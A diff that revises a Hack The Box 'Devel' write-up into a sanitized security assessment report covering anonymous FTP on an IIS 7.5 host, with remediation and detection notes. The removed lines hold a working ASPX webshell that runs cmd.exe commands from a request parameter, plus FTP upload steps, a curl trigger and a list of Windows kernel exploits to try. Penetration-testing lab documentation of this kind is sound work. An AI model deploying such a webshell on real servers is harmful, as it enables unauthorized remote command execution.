@@ -1,114 +1,100 @@
-<div align="center">
+# Devel — Security Assessment
 
-# 📂 HTB: Devel
+| Field | Value |
+| --- | --- |
+| Platform | Hack The Box |
+| Operating system | Windows |
+| Difficulty | Easy |
+| Assessment date | 2026-01-03 (from existing notes; timezone not recorded) |
+| Author | Dylan Senez / d4rkgunn3r |
+| Review status | Proposed revision; publication eligibility and evidence review pending |
 
-![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square)
-![Status](https://img.shields.io/badge/Status-Recon%20%2B%20Confirmed%20Vuln-yellow?style=flat-square)
+## 1. Executive summary
 
-`hackthebox` `windows` `iis` `ftp` `unrestricted-file-upload`
+Anonymous FTP access and an IIS-associated directory listing are documented. The reviewed narrative does not supply proof of upload, executable content, a shell, or privilege escalation.
 
-</div>
+## 2. Scope and authorization
 
----
+This account concerns the assigned HTB laboratory target only. Target addresses, VPN information, secrets, and flag contents are excluded. This revision analyzes recorded work; no assessment commands were executed during the editorial review. Machine retirement status has not been freshly verified.
 
-> **TL;DR** — Anonymous FTP has write access to the live IIS webroot. Drop an ASPX webshell over FTP, hit it over HTTP, and it executes as the IIS worker process. This writeup covers recon through confirming the vulnerability — the notes don't record the actual webshell trigger, privesc, or flags, so treat the exploitation section as the documented path forward rather than a completed run.
+## 3. Methodology and reproducibility
 
-## 📋 Box Info
+Discovery → service analysis → recorded access path → privilege/impact assessment → evidence review → remediation. Commands below support authorized discovery and identity verification. Exploitation is described at the finding level; operational payloads and secret-extraction procedures are omitted.
 
-| | |
-|---|---|
-| 🖥️ **OS** | Windows (IIS 7.5 era — Windows 7 / Server 2008 R2) |
-| 🎯 **Target** | `<TARGET_IP>` |
-| 🎚️ **Difficulty** | Easy |
-| 📅 **Date** | January 3, 2026 |
-| 🏁 **Status** | 🟡 Vulnerability confirmed — exploitation/privesc not logged |
-
-## 🔍 Recon
+Set the address of the currently assigned lab instance before discovery:
 
 ```bash
-nmap -sV -sC -p- <TARGET_IP> -T4 --min-rate 5000
+export TARGET_IP='REPLACE_WITH_ASSIGNED_LAB_IP'
+mkdir -p evidence/devel/{scans,screenshots}
+nmap -sV -p 21,80 -oA evidence/devel/scans/services "$TARGET_IP"
 ```
 
-Only two ports open, out of 65,535 scanned — the rest sit `filtered`:
+This is a proposed targeted confirmation command, not the original full-port scan. Nmap creates traffic and local output files. Record tool versions, instance date, and timezone; compare results with the observations below rather than assuming the same services are still present.
 
-| Port | Service |
-|:---:|---|
-| `21` | Microsoft ftpd — **anonymous login allowed (FTP code 230)** |
-| `80` | Microsoft IIS httpd 7.5 |
+## 4. Reconnaissance and service analysis
 
-The FTP directory listing immediately confirms the webroot connection:
+21 Microsoft FTP with anonymous login accepted; 80 IIS 7.5. The FTP listing contains IIS default filenames.
 
-```
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|   <DIR>          aspnet_client
-|                  iisstart.htm
-|                  welcome.png
-```
+> **EV-001 — Evidence placeholder:** add the reviewed service-scan excerpt and screenshot here. Remove sensitive identifiers. No screenshot file is claimed to exist at this placeholder.
 
-`iisstart.htm` and `welcome.png` are IIS's own default files — this FTP root **is** `C:\inetpub\wwwroot`.
+## 5. Recorded initial-access path
 
----
+Default filenames support a suspected connection between FTP storage and the web content directory; they do not independently prove the physical webroot mapping, write permissions, or server-side execution.
 
-## 🚩 Confirmed Vulnerability — Anonymous FTP Write to Webroot
+> **EV-002 — Evidence placeholder:** add a sanitized artifact establishing the behavior and resulting identity. An HTTP success response or tool success message alone does not prove code execution.
 
-> ⚠️ **Root cause:** anonymous FTP is enabled *and* granted write access to a directory that IIS serves and executes content from (CWE-276, incorrect default permissions). Any file dropped over FTP is immediately reachable — and if it's `.aspx`, executable — over HTTP.
+## 6. Privilege escalation and impact validation
 
-**The documented path forward:**
+No privilege-escalation result is documented in this file. A separate repository review records a matching Rooted source record, which is a status assertion rather than proof of the missing steps.
 
-```bash
-ftp <TARGET_IP>
-# user: anonymous / blank password
+In an already authorized session, record identity without reading objective contents:
+
+```powershell
+whoami
+hostname
+whoami /priv
 ```
 
-Upload a minimal ASPX webshell:
+These are proposed identity-verification commands, not a claim of rerunning the assessment. Windows privilege enumeration does not prove successful elevation; Linux sudo policy alone does not prove a root session.
 
-```aspx
-<%@ Page Language="C#" %>
-<% Response.Write(new System.Diagnostics.Process{
-     StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"])
-     {RedirectStandardOutput=true,UseShellExecute=false}
-   }.Start().StandardOutput.ReadToEnd()); %>
-```
+> **EV-003 — Evidence placeholder:** add policy/permission evidence and the resulting identity or access proof. Never include flags, tokens, private keys, hashes of credentials, or password values.
 
-```bash
-put shell.aspx
-```
+## 7. Evidence register and limitations
 
-```bash
-curl "http://<TARGET_IP>/shell.aspx?c=whoami"
-```
+| ID | Required artifact | Current status |
+| --- | --- | --- |
+| EV-001 | Service inventory and timestamped scan excerpt | Text observations available; original artifact review pending |
+| EV-002 | Initial-access behavior and identity proof | Existing narrative reviewed; sanitized artifact pending |
+| EV-003 | Privilege boundary and impact proof | Not documented in reviewed narrative |
 
-That should return the IIS worker process identity — typically `IIS APPPOOL\DefaultAppPool` or `NT AUTHORITY\NETWORK SERVICE`.
+Anonymous access documented. Executable upload and SYSTEM access remain unverified.
 
-**From there (standard path for this box's era, not independently verified here):**
-- `systeminfo` to confirm exact build
-- Given the IIS 7.5 / 2008R2-era fingerprint, known local kernel exploits worth checking: **MS15-051** (CVE-2015-1701), **MS16-032** (CVE-2016-0099), **MS10-015** (CVE-2010-0232)
-- Escalate to SYSTEM, capture both flags
+The source is [the existing repository note](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/devel.md), reviewed at blob SHA `11a63a3740a31ba625bfec2694a701fbb83f9ccb`, plus [the repository source review](./EVIDENCE-REVIEW.md). 
 
----
+A Rooted status is not a substitute for a terminal transcript. Reported results are attributed to the existing notes; they have not been independently reproduced in this review. CVE numbers, fixed-version claims, unsupported timing claims, and numerical severity scores are withheld where primary-source verification is missing.
 
-## 📦 Other Findings
+## 8. Findings and remediation
 
-| Severity | Finding |
-|---|---|
-| Low | HTTP TRACE method enabled — minor XST exposure, low practical risk on modern browsers. |
-| Informational | `Server: Microsoft-IIS/7.5` header discloses version, pointing at an EOL OS generation (Server 2008 R2 / Windows 7 extended support ended January 2020). |
+| ID | Finding / review target | Remediation |
+| --- | --- | --- |
+| F-001 | Anonymous FTP exposure | Disable anonymous access unless explicitly required; enforce read-only permissions and review accessible data. |
+| F-002 | Possible shared FTP/web content path | Verify directory mapping; segregate upload storage and prohibit executable content in upload directories. |
+| F-003 | Legacy service fingerprint | Confirm installed OS and support status using host inventory; migrate unsupported components. |
 
-## 🛠️ Remediation (for what's confirmed)
+These include suspected configuration risks; write access and executable uploads remain unconfirmed.
 
-| Finding | Fix |
-|---|---|
-| Anonymous FTP write access to IIS webroot | Disable anonymous FTP entirely, or at minimum strip write permissions; separate any legitimate upload path from anything IIS executes. |
-| Executable uploads reachable over HTTP | Use IIS request filtering to block execution of files in upload-reachable paths. |
-| EOL OS / IIS version | Upgrade — this build has been out of extended support since 2020. |
+## 9. Detection opportunities
 
----
+FTP authentication/upload logs correlated with IIS requests and worker-process activity. Tune for authorized file distribution. Do not infer compromise from filenames alone.
 
-<div align="center">
+Collect relevant application, authentication, process, and file-change logs. Correlate events by account, host, and time; a single suspicious request is not proof of successful compromise. These are detection proposals, not tested rules or observed telemetry.
 
-*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*
+## 10. Remediation validation
 
-⚠️ *Work in progress — go back and log the webshell trigger, privesc method, and flags to close this one out.*
+Verify corrected permissions and authentication/authorization policy using approved test accounts and administrative configuration review. Confirm exposed secrets were rotated and removed from distributed artifacts. Validate that legitimate workflows still function and monitoring captures permitted test activity. Preserve before/after evidence without exposing sensitive values.
 
-</div>
+## 11. Lessons learned and remaining work
+
+Use observed identities and access results to establish impact. Keep service exposure separate from validated weaknesses and distinguish suggested methods from executed steps. Before publication, resolve the gaps in Sections 5–7, verify platform permission, and review every image and output for secrets.
+
+[Back to walkthrough inventory](./README.md)
